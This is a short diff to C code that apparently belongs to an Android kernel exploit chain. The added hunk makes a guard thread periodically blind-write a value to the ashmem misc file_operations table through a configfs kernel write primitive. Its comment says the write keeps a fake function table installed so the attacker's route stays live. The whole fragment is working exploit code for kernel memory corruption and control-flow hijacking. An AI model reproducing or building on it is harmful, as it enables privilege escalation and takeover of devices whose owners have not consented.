@@ -95,6 +95,22 @@ static void *fops_guard_thread(void *arg __attribute__((unused))) {
           pr_warning("fops guard read fail n=%zd errno=%d count=%d expect=%016zx\n",
                      n, errno, read_fail, expect);
         }
+        /*
+         * fix62 blind restore: the read half is dead but a write window may
+         * still twitch open (transient ENOTTY family, fix56 kin).  While
+         * the chain runs, expect is the fake table -- blind-writing it
+         * re-asserts our route; once the fail path flips expect to the
+         * canonical REAL table (close_fake_fops_probe_fd containment),
+         * this same write defuses the third-party misc_open landmine the
+         * moment the channel recovers.  A dead channel just returns a
+         * harmless ENOTTY; rate-limited to every 500th failed read.
+         */
+        if ((read_fail % 500) == 0) {
+          ssize_t w = configfs_write_once(
+              g_fops_probe_fd, text_addr(ASHMEM_MISC_FOPS), &expect, 8);
+          pr_warning("fops guard blind restore ret=%zd errno=%d expect=%016zx\n",
+                     w, errno, expect);
+        }
       } else {
         read_fail = 0;
         if ((uintptr_t)cur != expect) {
